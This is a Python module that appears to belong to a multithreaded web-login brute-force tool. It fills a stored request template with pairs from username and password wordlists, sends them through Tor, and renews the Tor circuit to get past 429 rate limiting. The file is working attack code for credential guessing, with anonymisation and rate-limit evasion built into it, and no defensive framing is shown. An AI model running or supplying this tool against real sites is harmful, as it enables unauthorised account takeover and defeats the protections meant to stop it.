from .request import request, Tor, test_ip
from .loggin import log
from .lists import read_header_file, read_wordlist
from .response import check_response
from .database import db
from src.Shell.shell import cache
import math
import time
import threading
import subprocess
import json

tor = Tor(control_port=cache.get("control_port"))

def load_options():
    target = log.input("Target> ")
    global method
    global url
    global data
    global headers
    global fail
    global success

    database = db(target.split("/")[2])
    if not database:
        url = None
        data = None
        return log.critical("Please run 'init' before start the attack")
    datas = database.all()[0]


    url = datas['url']
    headers = read_header_file(datas['headers'])
    data = datas['data']
    method = datas['method']
    success = datas['success']
    fail = datas['fail']

    log.info(f"Loaded Request Body: {json.dumps(datas)}", extra={"bold": True})
    log.info(f"Data payload 'data' is '{data}'", extra={"bold": True})

def test_tor():
    try:
        test_ip()
    except Exception:
        log.warn("You are not using Tor", extra={"bold": True})
        yn = log.input("Do you want to execute Tor and connect to ControlPort? [Y/n] ")
        if "y" in yn.lower():
            log.debug("Executing Tor...")
            tor_process = subprocess.Popen(['tor'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            for line in iter(tor_process.stdout.readline, ''):
                if "Done" in line:
                    log.tor("The Tor Connection is ready")
                    break
            log.info("Connected to the Tor", extra={"bold": True})
            log.info(f"Starting to connect to ControlPort (127.0.0.1:{cache.get("control_port")})")
            password = log.input("Password (if there isn't password, leave it blank): ")
            tor.connect(password)
            test_tor()

THREADS = []

def load(usernames, passwords):
    USERNAMES = read_wordlist(usernames)
    PASSWORDS = read_wordlist(passwords)

    if USERNAMES[0] == "Needed" or PASSWORDS[0] == "Needed":
        return

    log.info(f"The Wordlist(s) was loaded with successfully\n - Password(s): {len(PASSWORDS)}\n - Username(s): {len(USERNAMES)}", extra={"bold": True})

    PASSWORDS_GROUPED = group(PASSWORDS)
    total = len(USERNAMES) * len(PASSWORDS)

    return [USERNAMES, PASSWORDS_GROUPED, total]

num_threads = cache.get("threads")

def group(list):
    chunks_size = math.ceil(len(list) / num_threads)
    return [list[i * chunks_size:(i + 1) * chunks_size] for i in range(num_threads)]

def check(res):
    sf = check_response(my_response=success or fail, response=res)
    if (success and sf) or (fail and not sf):
        return True
    return False

times = 0

def send(username, password, i, i_, timeout, total, id=None):
    try:
        res = request(method=method,
            url=url,
             data=data.replace("^USER^", username)
            .replace("^PASS^", password)
            .replace("^TMSTMP^", str(time.time() * 1000)),
             headers=headers
            )
        if res.status_code == 429:
            log.warn("It seems you got 429 (Too Many Requests).", extra={"bold": True})
            yn = log.input("Do you want to increase the Timeout and create a new Tor Circuit? [Y/n]")
            if "y" in yn:
                if timeout == 0:
                    timeout+=1
                cache.set("timeout", timeout*2)
                log.info(f"Now the new timeout is {timeout}")
                tor.renew_circuit()
                test_ip()
                send(username, password, i, i_, timeout, id)
            else:
                return log.critical("The request got 429 (Too many requests)")
        had_success = check(res)
        log.attempt({ "attempt": cache.get("attempts"),
                      "total": total,
                      "username": username,
                      "password": password,
                      "status_code": res.status_code
                      }, had_success=had_success, id=id)
        if had_success:
            return True
        cache.set("attempts", cache.get("attempts") + 1)
    except (ConnectionError, ConnectionRefusedError, ConnectionResetError, ConnectionAbortedError):
        log.reattempt({"attempt": cache.get("attempt"),
                             "total": total,
                             "username": username,
                             "password": password,
                             "status_code": "CONNECTION_ERROR"
                             }, id=id)
        send(username, password, i, i_, timeout, total, id)

def loops(usernames, passwords_grouped, thread_id, total):
    break_loop = False
    for i, u in enumerate(usernames):
        for i_, p in enumerate(passwords_grouped[thread_id]):
            timeout = int(cache.get("timeout"))
            b = send(u, p, i=i_, i_=i, timeout=timeout, id=thread_id, total=total)
            if b:
                break_loop = True
                break
            time.sleep(timeout)
        if break_loop:
            break

def threads(users, passd):
    load_options()
    if None in [url, data]:
        return
    test_tor()
    [usernames, passwords, total] = load(usernames=users, passwords=passd)
    if not usernames or not passwords:
        return log.critical(f"Password(s) is null or Username is null ({usernames},{passwords})")
    for i in range(num_threads):
        t = threading.Thread(target=loops, args=(usernames, passwords, i, total), daemon=True)
        THREADS.append(t)
        log.debug(f"The thread {i} was created")

    for i, t in enumerate(THREADS):
        t.start()
        log.debug(f"The thread {i} was started", extra={"bold": True})

    for t in THREADS:
        t.join()